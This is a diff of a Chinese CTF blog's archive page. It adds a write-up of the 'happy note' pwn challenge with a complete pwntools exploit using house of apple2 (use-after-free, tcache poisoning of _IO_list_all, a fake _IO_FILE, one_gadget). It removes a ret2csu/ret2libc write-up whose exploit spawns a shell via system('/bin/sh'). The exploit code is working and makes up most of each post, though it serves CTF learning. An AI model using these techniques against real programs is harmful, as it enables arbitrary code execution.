@@ -76,6 +76,169 @@
     <div class="article-wrap">
         
             <h2 class="article-title cl">
+                <a href="/2025/04/23/巅峰极客-2022-happy-note-高版本glibc-IO-FILE初探/" title="[巅峰极客 2022]happy note - 高版本glibc _IO_FILE初探">
+                    [巅峰极客 2022]happy note - 高版本glibc _IO_FILE初探
+                </a>
+            </h2>
+        
+
+        <ul class="article-extra" style="margin-bottom: 20px">
+            
+            <li class="article-time">
+                2025-04-23
+            </li>
+            
+
+            
+                
+            
+
+
+        </ul>
+        <div class="article-description">
+            
+            <p>第一次打高版本的_IO_FILE利用 也算正式进入了 house of家族了。</p>
+<p>这次用的是比较简单的house of apple2 </p>
+<p>因为_wide_data 的 _wide_vtable 没有像正常的_IO_FILE结构的 vtable检查</p>
+<p>所以可以通过伪造_IO_LIST_ALL 指向的 _IO_FILE 结构 </p>
+<p>在伪造指向的_WIDE_DATA 和 修改_IO_FIILE的vtable为_IO_wfile_jumps(可以符合vtable检查)</p>
+<p>同时把单链表指向的下一个_IO_FILE结构的_chain值破坏掉 引发刷新 然后就可以碰到one gadget</p>
+<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *
+<span class="hljs-comment">#from LibcSearcher import *</span>
+context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
+context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span>
+<span class="hljs-comment">#io = remote(&quot;node4.anna.nssctf.cn&quot;,28710)</span>
+io = process(<span class="hljs-string">&quot;./happy_note&quot;</span>)
+e = ELF(<span class="hljs-string">&#x27;./happy_note&#x27;</span>)
+libc = ELF(<span class="hljs-string">&#x27;/home/rick/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6&#x27;</span>)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():
+	<span class="hljs-keyword">return</span> u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">bug</span>():
+    attach(io)
+
+s       = <span class="hljs-keyword">lambda</span> data               :io.send(data)
+sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
+sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
+sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
+r       = <span class="hljs-keyword">lambda</span> num                :io.recv(num)
+ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
+itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
+uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
+uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
+ls      = <span class="hljs-keyword">lambda</span> data               :log.success(data)
+dlog     = <span class="hljs-keyword">lambda</span> name,data         :log.success(<span class="hljs-string">f&quot;get <span class="hljs-subst">&#123;name&#125;</span>=&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(data))
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,idx,mode</span>):
+    sla(<span class="hljs-string">b&quot;&gt;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))
+    sla(<span class="hljs-string">b&quot;size:&quot;</span>,<span class="hljs-built_in">str</span>(size))
+    sla(<span class="hljs-string">b&quot;note:&quot;</span>,<span class="hljs-built_in">str</span>(idx))
+    sla(<span class="hljs-string">b&quot;or [2]&quot;</span>,<span class="hljs-built_in">str</span>(mode))    
+    <span class="hljs-comment">#mode 1 = calloc mode 2 = malloc only 2 twice</span>
+    <span class="hljs-comment">#input 666 can be uaf once </span>
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):
+    sla(<span class="hljs-string">b&quot;&gt;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))
+    sla(<span class="hljs-string">b&quot;note:&quot;</span>,<span class="hljs-built_in">str</span>(idx))
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):
+    sla(<span class="hljs-string">b&quot;&gt;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))
+    sla(<span class="hljs-string">b&quot;to show?&quot;</span>,<span class="hljs-built_in">str</span>(idx))
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):
+    sla(<span class="hljs-string">b&quot;&gt;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))
+    sla(<span class="hljs-string">b&quot;note:&quot;</span>,<span class="hljs-built_in">str</span>(idx))
+    sa(<span class="hljs-string">b&quot;content:&quot;</span>,content)
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>):
+     add(<span class="hljs-number">0x160</span>,i,<span class="hljs-number">1</span>)
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):
+     delete(i)
+sla(<span class="hljs-string">b&quot;&gt;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">666</span>))
+sla(<span class="hljs-string">b&quot;note:&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">7</span>))
+delete(<span class="hljs-number">9</span>)
+<span class="hljs-comment">#现在7号区块bk为9号区块的heap_addr ,fd是main_arena , unsortbin没有safe-linking</span>
+show(<span class="hljs-number">7</span>)
+ru(<span class="hljs-string">b&quot;content: &quot;</span>)
+leak_main_arena = uu64(r(<span class="hljs-number">6</span>))
+dlog(<span class="hljs-string">&quot;leak_main_arena&quot;</span>,leak_main_arena)
+edit(<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)
+show(<span class="hljs-number">7</span>)
+ru(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">8</span>)
+leak_heap_addr = uu64(r(<span class="hljs-number">6</span>))
+dlog(<span class="hljs-string">&quot;leak_heap_addr&quot;</span>,leak_heap_addr)
+edit(<span class="hljs-number">7</span>,p64(leak_main_arena)+p64(leak_heap_addr)) <span class="hljs-comment">#fix</span>
+libc_base = leak_main_arena - <span class="hljs-number">96</span> - <span class="hljs-number">0x150</span> - libc.sym[<span class="hljs-string">&quot;_IO_2_1_stdin_&quot;</span>] - <span class="hljs-number">144</span>
+dlog(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)
+heap_base = leak_heap_addr - <span class="hljs-number">0xf80</span>
+dlog(<span class="hljs-string">&quot;heap_base&quot;</span>,heap_base)
+libc_io_list_all = libc_base + libc.sym[<span class="hljs-string">&quot;_IO_list_all&quot;</span>]
+dlog(<span class="hljs-string">&quot;libc_io_list_all&quot;</span>,libc_io_list_all)
+enctypted_fd = (leak_heap_addr &gt;&gt; <span class="hljs-number">12</span>)^libc_io_list_all
+add(<span class="hljs-number">0x90</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)
+add(<span class="hljs-number">0x90</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)
+delete(<span class="hljs-number">1</span>)
+delete(<span class="hljs-number">7</span>) <span class="hljs-comment"># idx 0 still uaf</span>
+edit(<span class="hljs-number">0</span>,p64(enctypted_fd))
+add(<span class="hljs-number">0x90</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)
+add(<span class="hljs-number">0x90</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>) <span class="hljs-comment"># use malloc and get _IO_list_all</span>
+fake_file_io_struct = heap_base + <span class="hljs-number">0x1260</span>
+fake_wide_data = fake_file_io_struct + <span class="hljs-number">0x210</span>
+io_wfile_jumps = libc_base + libc.sym[<span class="hljs-string">&quot;_IO_wfile_jumps&quot;</span>]
+dlog(<span class="hljs-string">&quot;fake_file_io_struct&quot;</span>,fake_file_io_struct)
+dlog(<span class="hljs-string">&quot;fake_wide_data&quot;</span>,fake_wide_data)
+dlog(<span class="hljs-string">&quot;io_wfile_jumps&quot;</span>,io_wfile_jumps)
+og = [<span class="hljs-number">0x50a37</span>,<span class="hljs-number">0xebcf1</span>,<span class="hljs-number">0xebcf5</span>,<span class="hljs-number">0xebcf8</span>]
+ogg = libc_base + og[<span class="hljs-number">1</span>]
+<span class="hljs-comment">#edit(10,payload)</span>
+add(<span class="hljs-number">0x200</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>) <span class="hljs-comment">#fake io_list_all</span>
+add(<span class="hljs-number">0x200</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>) <span class="hljs-comment">#_fake_wide_data</span>
+add(<span class="hljs-number">0x200</span>,<span class="hljs-number">5</span>,<span class="hljs-number">1</span>) <span class="hljs-comment">#_fake_wide_vtable</span>
+fake_io_list_all_struct = FileStructure()
+fake_io_list_all_struct._IO_read_ptr = <span class="hljs-number">0x521</span>
+fake_io_list_all_struct._IO_read_end = <span class="hljs-number">0x1000</span>
+fake_io_list_all_struct._IO_write_ptr = <span class="hljs-number">0x1000</span>
+fake_io_list_all_struct._wide_data = fake_wide_data+<span class="hljs-number">0x10</span>
+fake_io_list_all_struct.vtable = io_wfile_jumps
+fake_io_list_all_struct.chain = <span class="hljs-number">0x1234</span> <span class="hljs-comment">#通过把chain设置成乱七八糟的值破坏链表 从而刷新触发ogg</span>
+edit(<span class="hljs-number">3</span>,<span class="hljs-built_in">bytes</span>(fake_io_list_all_struct))
+
+fake_vtable = heap_base + <span class="hljs-number">0x1680</span> <span class="hljs-comment"># idx0 </span>
+edit(<span class="hljs-number">5</span>,p64(ogg)*<span class="hljs-number">40</span>) <span class="hljs-comment"># fill ogg</span>
+
+fake_wide_data = p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x510</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">0x1a</span>
+fake_wide_data += p64(fake_vtable+<span class="hljs-number">0x10</span>)
+edit(<span class="hljs-number">4</span>,<span class="hljs-built_in">bytes</span>(fake_wide_data))
+edit(<span class="hljs-number">2</span>,p64(fake_file_io_struct+<span class="hljs-number">0x10</span>))
+
+<span class="hljs-comment">#attach(io)</span>
+delete(<span class="hljs-number">7</span>)<span class="hljs-comment">#使用 [返回到main函数]触发house of apple2</span>
+
+<span class="hljs-comment">#现在的接收都是u64(p.recv(5).ljust(8,b’\x00’)) &lt;&lt; 12</span>
+<span class="hljs-comment">#而修改heap的fd指针则是(heap_addr &gt;&gt; 12)^target_addr</span>
+
+io.interactive()</code></pre>
+
+<p>两次malloc 一次uaf 可以通过unsortbin切割块进tcache 然后通过uaf改 进tcache的fd 就可以拿到IO_LIST_ALL的写 然后覆盖成伪造的结构 然后触发返回到main函数 就可以触发one_gadget</p>
+<p>house家族真心有点难…</p>
+
+        </div>
+        
+            
+        
+        
+    </div>
+</article>
+
+        
+            
+            <article class="article">
+    <div class="article-wrap">
+        
+            <h2 class="article-title cl">
                 <a href="/2025/04/23/pwngdb解决更换libc后不加载符号-IO-FILE等结构没有符号的问题/" title="pwngdb解决更换libc后不加载符号/_IO_FILE等结构没有符号的问题">
                     pwngdb解决更换libc后不加载符号/_IO_FILE等结构没有符号的问题
                 </a>
@@ -1175,112 +1338,6 @@ p.interactive()</code></pre>
 </article>
 
         
-            
-            <article class="article">
-    <div class="article-wrap">
-        
-            <h2 class="article-title cl">
-                <a href="/2025/04/20/ret2csu-第一次解答/" title="ret2csu 第一次解答">
-                    ret2csu 第一次解答
-                </a>
-            </h2>
-        
-
-        <ul class="article-extra" style="margin-bottom: 20px">
-            
-            <li class="article-time">
-                2025-04-20
-            </li>
-            
-
-            
-                
-            
-
-
-        </ul>
-        <div class="article-description">
-            
-            <blockquote>
-<p>Problem: <a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/5949">[SWPUCTF 2024 秋季新生赛]出题人你到底干了什么？</a></p>
-</blockquote>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>Linux x64 Linux x86-64传递参数的方式几乎和Windows一样。但是是通过6个寄存器代替4个寄存器来传参(RDI,RSI,RDX,RCX,R8,R9)</p>
-<p>可以用ret2csu来解答</p>
-<blockquote>
-<p>.text:0000000000401226 loc_401226:                             ; CODE XREF: __libc_csu_init+35↑j<br>.text:0000000000401226                 add     rsp, 8<br>.text:000000000040122A                 pop     rbx<br>.text:000000000040122B                 pop     rbp<br>.text:000000000040122C                 pop     r12<br>.text:000000000040122E                 pop     r13<br>.text:0000000000401230                 pop     r14<br>.text:0000000000401232                 pop     r15<br>.text:0000000000401234                 retn</p>
-</blockquote>
-<p>这是需要使用的第一个gadget 避免麻烦直接从40122A开始用</p>
-<p>rbx一般设置0 rbp一般设置1 </p>
-<blockquote>
-<p> loc_401210:                             ; CODE XREF: __libc_csu_init+54↓j<br> .text:0000000000401210                 mov     rdx, r14 第一个参数<br> .text:0000000000401213                 mov     rsi, r13 第二个参数<br> .text:0000000000401216                 mov     edi, r12d 第三个参数<br> .text:0000000000401219                 call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]<br> .text:000000000040121D                 add     rbx, 1<br> .text:0000000000401221                 cmp     rbp, rbx<br> .text:0000000000401224                 jnz     short loc_401210</p>
-</blockquote>
-<p>如果rbx设置0 也就是直接call[r15]<br>rbp设置1 可以在cmp     rbp, rbx 拿到0<br>从而不循环跳转loc_401210<br>又跳到loc_401226<br>因为add rsp, 8 所以需要多溢出8字节<br>直接填充6*8 + 8 &#x3D; 56字节脏数据<br>然后到ret 接一个main重新溢出<br>然后就可以按照正常的ret2libc打了</p>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="hljs python">  <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
-context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
-elf = ELF(<span class="hljs-string">&quot;./attachment&quot;</span>)
-libc = ELF(<span class="hljs-string">&#x27;/home/rick/glibc-all-in-one/libs/2.31-0ubuntu9.17_amd64/libc-2.31.so&#x27;</span>)
-p = remote(<span class="hljs-string">&quot;node6.anna.nssctf.cn&quot;</span>,<span class="hljs-number">26697</span>)
-<span class="hljs-comment">#p = process(&quot;attachment&quot;)</span>
-write_got = elf.got[<span class="hljs-string">&quot;write&quot;</span>]
-write_plt = elf.plt[<span class="hljs-string">&quot;write&quot;</span>]
-gadget_csu_first = <span class="hljs-number">0x40122A</span>
-gadget_csu_second = <span class="hljs-number">0x401210</span>
-main_addr = elf.sym[<span class="hljs-string">&quot;main&quot;</span>]
-payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">88</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">16</span>
-payload += p64(gadget_csu_first)
-payload += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#pop     rbx set 0</span>
-payload += p64(<span class="hljs-number">1</span>) <span class="hljs-comment">#pop     rbp set 1</span>
-payload += p64(<span class="hljs-number">1</span>) <span class="hljs-comment">#pop r12 =&gt; rdi first argument</span>
-payload += p64(write_got) <span class="hljs-comment">#pop r13 =&gt; rsi 2 arguc</span>
-payload += p64(<span class="hljs-number">8</span>) <span class="hljs-comment">#pop r14 =&gt; rdx 3</span>
-payload += p64(write_got) <span class="hljs-comment">#pop r15 =&gt; need call 应该是call 到机器码了 而不是实际的地址 所以用got表里面的 plt 里面是 jmp call 机器码肯定报错</span>
-<span class="hljs-comment"># write(1, byte_402008, v3);</span>
-<span class="hljs-string">&#x27;&#x27;&#x27;</span>
-<span class="hljs-string">call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]</span>
-<span class="hljs-string">.text:0000000000401221                 cmp     rbp, rbx</span>
-<span class="hljs-string">.text:0000000000401224                 jnz     short loc_401210</span>
-<span class="hljs-string">&#x27;&#x27;&#x27;</span>
-payload += p64(gadget_csu_second)
-<span class="hljs-comment">#设置脏数据  add     rsp, 8  所以多设置8个字节脏数据</span>
-payload += p64(<span class="hljs-number">0xdeadbeef</span>)*<span class="hljs-number">7</span>
-payload += p64(main_addr)
-
-<span class="hljs-string">&#x27;&#x27;&#x27;</span>
-<span class="hljs-string">.plt.sec:0000000000401060 _write          proc near               ; CODE XREF: main+32↓p</span>
-<span class="hljs-string">.plt.sec:0000000000401060 ; __unwind &#123;</span>
-<span class="hljs-string">.plt.sec:0000000000401060                 endbr64</span>
-<span class="hljs-string">.plt.sec:0000000000401064                 bnd jmp cs:off_404018</span>
-<span class="hljs-string">.plt.sec:0000000000401064 _write          endp</span>
-<span class="hljs-string"></span>
-<span class="hljs-string">&#x27;&#x27;&#x27;</span>
-
-
-<span class="hljs-comment">#attach(p)</span>
-p.send(payload)
-p.recvuntil(<span class="hljs-string">b&quot;!\n&quot;</span>)
-leak_got = u64(p.recv(<span class="hljs-number">8</span>))
-log.success(<span class="hljs-string">&quot;leak write got=&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(leak_got))
-libc_base = leak_got - libc.sym[<span class="hljs-string">&quot;write&quot;</span>]
-pop_rdi_ret = <span class="hljs-number">0x401233</span>
-system_addr = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]
-bin_sh_addr = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>))
-ret = <span class="hljs-number">0x40101a</span>
-payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">88</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">16</span> +p64(ret) +p64(pop_rdi_ret) + p64(bin_sh_addr) +p64(system_addr)
-p.send(payload)
-
-p.interactive()</code></pre>
-<p>需要注意的是设置r15 call的时候不能设置plt<br>因为plt里面的是jmp [offset]<br>你call他 就 相当于 call 机器码了 必报错<br>然后payload2 加一个ret 不加不对齐报错</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>ret2csu retlibc</p>
-
-        </div>
-        
-            
-        
-        
-    </div>
-</article>
-
-        
         <ul class="pagination clear">
     <a class="extend prev" rel="prev" href="/archives/2025/">上一页</a><a class="page-number" href="/archives/2025/">1</a><span class="page-number current">2</span><a class="page-number" href="/archives/2025/page/3/">3</a><a class="extend next" rel="next" href="/archives/2025/page/3/">下一页</a>
 </ul>
@@ -1294,14 +1351,14 @@ p.interactive()</code></pre>
         
         <div class="widget-post widget" style="order: 1 ">
             <h2 class="widget-title"><i class="fa fa-file-text"></i> 近期文章</h2>
-            <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2025/05/08/house-of-orange-%E6%AC%A7%E6%B6%A6%E5%90%89/">house of orange(欧润吉)</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/2025-4-26-BOCCHI-THE-ROCK-%E4%B8%8A/">2025/4/26 BOCCHI THE ROCK(上)</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup/">从0开始的web生涯 - [SWPUCTF 2021 新生赛]no_wakeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-Do-you-know-http/">从0开始的web生涯 - [SWPUCTF 2021 新生赛]Do_you_know_http</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/">从0开始的web生涯 - [SWPUCTF 2021 新生赛]ez_unserialize</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-WebFTP/">从0开始的web生涯 - [第五空间 2021]WebFTP</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-babyrce/">从0开始的web生涯 - [SWPUCTF 2021 新生赛]babyrce</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/24/%E8%AE%B0%E4%B8%80%E6%AC%A1vmware-linux%E6%89%A9%E5%B1%95-%E6%A0%B9%E7%9B%AE%E5%BD%95-%E5%88%86%E5%8C%BA/">记一次vmware linux扩展/(根目录)分区</a></li></ul>
+            <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2025/05/23/windows-hook-inline-hook/">windows hook - inline hook</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/05/08/house-of-orange-%E6%AC%A7%E6%B6%A6%E5%90%89/">house of orange(欧润吉)</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/2025-4-26-BOCCHI-THE-ROCK-%E4%B8%8A/">2025/4/26 BOCCHI THE ROCK(上)</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup/">从0开始的web生涯 - [SWPUCTF 2021 新生赛]no_wakeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-Do-you-know-http/">从0开始的web生涯 - [SWPUCTF 2021 新生赛]Do_you_know_http</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/">从0开始的web生涯 - [SWPUCTF 2021 新生赛]ez_unserialize</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-WebFTP/">从0开始的web生涯 - [第五空间 2021]WebFTP</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-babyrce/">从0开始的web生涯 - [SWPUCTF 2021 新生赛]babyrce</a></li></ul>
         </div>
         
 
         
         <div class="widget-tags widget" style="order: 2 ">
             <h2 class="widget-title"><i class="fa fa-tags"></i> 标签</h2>
-            <a href="/tags/BOCCHI-THE-ROCK/" style="font-size: 10px;">BOCCHI THE ROCK</a> <a href="/tags/IO-file/" style="font-size: 10px;">IO_file</a> <a href="/tags/IO-FILE/" style="font-size: 10px;">_IO_FILE</a> <a href="/tags/IO-FILEt/" style="font-size: 10px;">_IO_FILEt</a> <a href="/tags/malloc-hook/" style="font-size: 11.67px;">_malloc_hook</a> <a href="/tags/debug-symbol/" style="font-size: 10px;">debug-symbol</a> <a href="/tags/dirsearch/" style="font-size: 10px;">dirsearch</a> <a href="/tags/fastbin/" style="font-size: 10px;">fastbin</a> <a href="/tags/git-leak/" style="font-size: 10px;">git leak</a> <a href="/tags/glibc/" style="font-size: 16.67px;">glibc</a> <a href="/tags/header/" style="font-size: 10px;">header</a> <a href="/tags/heap/" style="font-size: 18.33px;">heap</a> <a href="/tags/heap-feng-shui/" style="font-size: 10px;">heap_feng_shui</a> <a href="/tags/house-of-apple2/" style="font-size: 10px;">house of apple2</a> <a href="/tags/house-of-orange/" style="font-size: 10px;">house of orange</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/off-by-one/" style="font-size: 10px;">off-by-one</a> <a href="/tags/one-gadget/" style="font-size: 10px;">one_gadget</a> <a href="/tags/orw/" style="font-size: 11.67px;">orw</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/pwngdb/" style="font-size: 10px;">pwngdb</a> <a href="/tags/rce/" style="font-size: 10px;">rce</a> <a href="/tags/ret2csu/" style="font-size: 10px;">ret2csu</a> <a href="/tags/ret2shellcode/" style="font-size: 10px;">ret2shellcode</a> <a href="/tags/ret2text/" style="font-size: 10px;">ret2text</a> <a href="/tags/root/" style="font-size: 10px;">root</a> <a href="/tags/safe-linking/" style="font-size: 10px;">safe-linking</a> <a href="/tags/shellcode/" style="font-size: 11.67px;">shellcode</a> <a href="/tags/stack/" style="font-size: 11.67px;">stack</a> <a href="/tags/stdout/" style="font-size: 10px;">stdout</a> <a href="/tags/tcache/" style="font-size: 13.33px;">tcache</a> <a href="/tags/uaf/" style="font-size: 10px;">uaf</a> <a href="/tags/unlink/" style="font-size: 11.67px;">unlink</a> <a href="/tags/unserialize/" style="font-size: 11.67px;">unserialize</a> <a href="/tags/vmware/" style="font-size: 10px;">vmware</a> <a href="/tags/web/" style="font-size: 15px;">web</a> <a href="/tags/%E4%B8%96%E7%95%8C%E6%9D%AF/" style="font-size: 11.67px;">世界杯</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/" style="font-size: 10px;">数据泄露</a> <a href="/tags/%E6%97%A5%E5%B8%B8/" style="font-size: 10px;">日常</a> <a href="/tags/%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">笔记</a> <a href="/tags/%E8%A7%A3%E5%86%B3/" style="font-size: 10px;">解决</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%97%AE%E9%A2%98/" style="font-size: 10px;">问题</a>
+            <a href="/tags/BOCCHI-THE-ROCK/" style="font-size: 10px;">BOCCHI THE ROCK</a> <a href="/tags/IO-file/" style="font-size: 10px;">IO_file</a> <a href="/tags/IO-FILE/" style="font-size: 10px;">_IO_FILE</a> <a href="/tags/IO-FILEt/" style="font-size: 10px;">_IO_FILEt</a> <a href="/tags/malloc-hook/" style="font-size: 11.67px;">_malloc_hook</a> <a href="/tags/debug-symbol/" style="font-size: 10px;">debug-symbol</a> <a href="/tags/dirsearch/" style="font-size: 10px;">dirsearch</a> <a href="/tags/fastbin/" style="font-size: 10px;">fastbin</a> <a href="/tags/git-leak/" style="font-size: 10px;">git leak</a> <a href="/tags/glibc/" style="font-size: 16.67px;">glibc</a> <a href="/tags/header/" style="font-size: 10px;">header</a> <a href="/tags/heap/" style="font-size: 18.33px;">heap</a> <a href="/tags/heap-feng-shui/" style="font-size: 10px;">heap_feng_shui</a> <a href="/tags/hook/" style="font-size: 10px;">hook</a> <a href="/tags/house-of-apple2/" style="font-size: 10px;">house of apple2</a> <a href="/tags/house-of-orange/" style="font-size: 10px;">house of orange</a> <a href="/tags/inline-hook/" style="font-size: 10px;">inline hook</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/off-by-one/" style="font-size: 10px;">off-by-one</a> <a href="/tags/one-gadget/" style="font-size: 10px;">one_gadget</a> <a href="/tags/orw/" style="font-size: 11.67px;">orw</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/pwngdb/" style="font-size: 10px;">pwngdb</a> <a href="/tags/rce/" style="font-size: 10px;">rce</a> <a href="/tags/ret2csu/" style="font-size: 10px;">ret2csu</a> <a href="/tags/ret2shellcode/" style="font-size: 10px;">ret2shellcode</a> <a href="/tags/ret2text/" style="font-size: 10px;">ret2text</a> <a href="/tags/root/" style="font-size: 10px;">root</a> <a href="/tags/safe-linking/" style="font-size: 10px;">safe-linking</a> <a href="/tags/shellcode/" style="font-size: 11.67px;">shellcode</a> <a href="/tags/stack/" style="font-size: 11.67px;">stack</a> <a href="/tags/stdout/" style="font-size: 10px;">stdout</a> <a href="/tags/tcache/" style="font-size: 13.33px;">tcache</a> <a href="/tags/uaf/" style="font-size: 10px;">uaf</a> <a href="/tags/unlink/" style="font-size: 11.67px;">unlink</a> <a href="/tags/unserialize/" style="font-size: 11.67px;">unserialize</a> <a href="/tags/vmware/" style="font-size: 10px;">vmware</a> <a href="/tags/web/" style="font-size: 15px;">web</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/%E4%B8%96%E7%95%8C%E6%9D%AF/" style="font-size: 11.67px;">世界杯</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/" style="font-size: 10px;">数据泄露</a> <a href="/tags/%E6%97%A5%E5%B8%B8/" style="font-size: 10px;">日常</a> <a href="/tags/%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">笔记</a> <a 